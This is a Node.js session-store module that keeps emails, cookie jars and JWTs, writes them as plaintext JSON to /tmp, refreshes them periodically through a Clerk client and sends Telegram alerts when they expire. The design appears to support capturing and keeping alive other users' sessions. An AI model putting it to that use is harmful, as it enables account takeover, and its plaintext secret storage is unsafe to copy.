'use strict';

// Session store: in-memory + best-effort file persistence

const fs = require('fs');

const FILE = process.env.SESSIONS_FILE || '/tmp/access_sessions.json';
const sessions = new Map();
const pending = new Map(); // sign_in_id -> { sign_in_id, email, email_address_id, jar, created_at }

function newId() {
  return 's' + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
}

function save() {
  try {
    fs.writeFileSync(FILE, JSON.stringify([...sessions.values()]));
  } catch (e) {
    console.error('[store] save failed:', e.message);
  }
}

function load() {
  try {
    const arr = JSON.parse(fs.readFileSync(FILE, 'utf8'));
    for (const r of arr) sessions.set(r.id, r);
    console.log('[store] restored ' + arr.length + ' session(s)');
  } catch (e) {
    /* no snapshot yet */
  }
}

function createSession(data) {
  const now = new Date().toISOString();
  const meta = (data.user && data.user.public_metadata) || {};
  const record = {
    id: newId(),
    email: data.email,
    sign_in_id: data.sign_in_id || null,
    session_id: data.session_id,
    client_id: data.client_id || null,
    user: data.user || {},
    user_status: meta.user_status || null,
    bonfire_user_id: meta.bonfire_user_id || null,
    status: 'ACTIVE',
    created_at: now,
    last_refresh_at: now,
    cookies: data.cookies || [],
    jwt: data.jwt || null,
    jwt_payload: data.jwt_payload || null,
    api_status: null,
    expiry_notified: false
  };
  sessions.set(record.id, record);
  save();
  return record;
}

function list() {
  return [...sessions.values()]
    .sort((a, b) => (a.created_at < b.created_at ? 1 : -1))
    .map((r) => ({
      id: r.id,
      email: r.email,
      session_id: r.session_id,
      client_id: r.client_id,
      user_id: r.user && r.user.id,
      user_status: r.user_status,
      status: r.status,
      created_at: r.created_at,
      last_refresh_at: r.last_refresh_at,
      cookie_count: (r.cookies || []).length,
      has_jwt: !!r.jwt
    }));
}

function get(id) {
  return sessions.get(id);
}

function remove(id) {
  const ok = sessions.has(id);
  sessions.delete(id);
  if (ok) save();
  return ok;
}

function count() {
  return sessions.size;
}

function addPending(p) {
  pending.set(p.sign_in_id, { ...p, created_at: Date.now() });
}

function getPending(id) {
  return pending.get(id);
}

function removePending(id) {
  pending.delete(id);
}

function pendingCount() {
  return pending.size;
}

function cleanupPending(ttlMs) {
  const now = Date.now();
  for (const [k, v] of pending) {
    if (now - v.created_at > ttlMs) pending.delete(k);
  }
}

// Refresh all active sessions (used by cron / maintenance).
// Keeps sessions alive by generating new cookies + JWT. Marks dead ones EXPIRED.
async function refreshAll(clerk, telegram) {
  let refreshed = 0;
  let expired = 0;
  for (const r of sessions.values()) {
    if (r.status !== 'ACTIVE') continue;
    try {
      await clerk.refreshSession(r);
      refreshed++;
    } catch (e) {
      r.status = 'EXPIRED';
      expired++;
      if (!r.expiry_notified) {
        r.expiry_notified = true;
        try {
          if (telegram && telegram.notifySessionExpired) await telegram.notifySessionExpired(r);
        } catch (e2) {
          console.error('[telegram]', e2.message);
        }
      }
    }
  }
  save();
  return { refreshed, expired };
}

module.exports = {
  save,
  load,
  createSession,
  list,
  get,
  remove,
  count,
  addPending,
  getPending,
  removePending,
  pendingCount,
  cleanupPending,
  refreshAll
};
